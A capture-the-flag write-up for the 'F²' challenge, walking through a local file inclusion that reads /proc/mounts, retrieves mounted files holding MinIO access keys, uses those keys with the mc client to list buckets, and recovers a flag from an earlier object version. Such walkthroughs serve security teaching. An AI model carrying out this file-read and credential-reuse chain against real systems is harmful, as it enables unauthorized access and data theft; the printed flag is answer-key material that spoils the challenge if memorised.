# F² Writeup

In this challenge, we’re given a parameter `f` that is vulnerable to **LFI**.  
At first glance, reading common files doesn’t reveal anything useful. But there’s a trick... (weel, not every LFI gives a flag directly)

Accessing the `/proc/mounts` file can sometimes give interesting insights into mounted volumes or filesystems:

👉 [https://f2.tekup-securinets.org/?f=/proc/mounts](https://f2.tekup-securinets.org/?f=/proc/mounts)

In the output, we notice some suspicious and uncommon files:

```
travler-gate  
travler-key  
travler-ep  
inventory-99
```

Let’s grab those files using LFI.

After fetching the `travler-gate`, `travler-key`, and `travler-ep`, we find what look like **access credentials** (possibly for a service).

Next, try sending a request to the IP used in the challenge:

```bash
curl -v http://185.91.127.50:13131
```

And here's the response:

```
< Server: MinIO
...
< HTTP/1.1 403 Forbidden
```

The `Server: MinIO` header tells us that we’re dealing with a MinIO instance — a self-hosted S3-compatible object storage service.

This confirms that the **access and secret keys** we found earlier belong to this MinIO service.

## Accessing MinIO

Download the MinIO client `mc` from the official site:  
👉 [Download Minio here](https://min.io/docs/minio/linux/index.html)

Then, configure it with the keys we found:

```bash
mc alias set traveler http://185.91.127.50:13131 ACCESS_KEY SECRET_KEY
```

Now, list the available buckets:

```bash
mc ls traveler
```

You should see a bucket named `inventory-99`.

## Step 4: Explore the Bucket

Let’s list the contents:

```bash
mc ls traveler/inventory-99
```

There’s a file named `item`. Download and inspect it:

```bash
mc cp traveler/inventory-99/item .
cat item
```

At first glance, it looks like just a list of inventory items... nothing special.

```
- id: 001
  name: Rusty Sword
  type: Weapon
  rarity: Common
  quantity: 1

- id: 002
  name: Healing Potion
  type: Consumable
  rarity: Uncommon
  quantity: 3

- id: 003
  name: Silver Key
  type: Quest Item
  rarity: Rare
  quantity: 1
```

But wait, one of the S3 features is versioning, and MinIO supports **versioning** on buckets. That means previous versions of the files might still be accessible.

Let’s list all versions of the `item` file:

```bash
mc ls --versions traveler/inventory-99
```

Copy and check the **first version** of the file:

```bash
mc cp --vid <version-id> traveler/inventory-99/item flag
cat flag
-> securinets{kk12121212121212121212kk}
```
